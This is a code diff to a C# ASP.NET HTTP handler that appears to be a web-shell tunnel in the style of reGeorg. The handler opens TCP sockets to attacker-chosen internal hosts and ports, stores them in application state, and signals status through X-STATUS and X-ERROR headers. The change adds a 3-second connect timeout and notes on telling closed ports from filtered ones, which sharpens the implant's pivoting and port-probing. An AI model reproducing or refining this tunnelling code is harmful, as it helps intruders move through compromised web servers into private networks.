@@ -85,10 +85,22 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
                         }
                         System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                         Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                        sender.Connect(remoteEP);
-                        sender.Blocking = false;
-                        context.Application[mark] = sender;
-                        context.Response.AddHeader("X-STATUS", "OK");
+
+                        // set the connect timeout to 3 seconds, default 20 seconds
+                        IAsyncResult result = sender.BeginConnect(remoteEP,null,null);
+                        bool success = result.AsyncWaitHandle.WaitOne( 3000, true );
+
+                        if ( sender.Connected ) {
+                            sender.Blocking = false;
+                            context.Application[mark] = sender;
+                            context.Response.AddHeader("X-STATUS", "OK");
+                        } else {
+                            // success == True ? "close" : "filtered"
+                            sender.Close();
+                            context.Response.AddHeader("X-ERROR", "Failed connecting to target");
+                            context.Response.AddHeader("X-STATUS", "FAIL");
+                        }
+
                     } catch (Exception ex) {
                         context.Response.AddHeader("X-ERROR", "Failed connecting to target");
                         context.Response.AddHeader("X-STATUS", "FAIL");
